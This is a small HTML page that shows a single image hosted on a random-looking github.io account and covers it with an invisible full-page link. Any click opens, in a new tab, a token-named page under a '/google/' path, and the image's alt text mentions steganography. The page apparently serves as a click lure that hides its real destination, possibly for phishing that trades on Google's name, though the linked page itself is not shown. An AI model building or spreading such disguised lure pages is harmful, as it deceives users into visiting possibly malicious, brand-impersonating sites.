<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Clickable Page</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: #000;
      overflow-x: hidden;
    }
    .wrapper {
      position: relative;
      width: 100%;
      max-width: 800px;
      margin: 0 auto;
    }
    .clickable-layer {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 10;
    }
    .content {
      position: relative;
      z-index: 1;
    }
    img {
      width: 100%;
      height: auto;
      display: block;
    }
  </style>
</head>
<body>
  <div class="wrapper">
    <a class="clickable-layer" href="https://john22bmaaatthew34-ui.github.io/google/hcYUXxUv6a1KpLYZsQHKq6ryGrAYRARo.html" target="_blank"></a>
    <div class="content">
      <img src="https://john22bmaaatthew34-ui.github.io/google/image_hidden_hcYUXxUv6a1KpLYZsQHKq6ryGrAYRARo.png" alt="Clickable Stegano Image" />
    </div>
  </div>
</body>
</html>
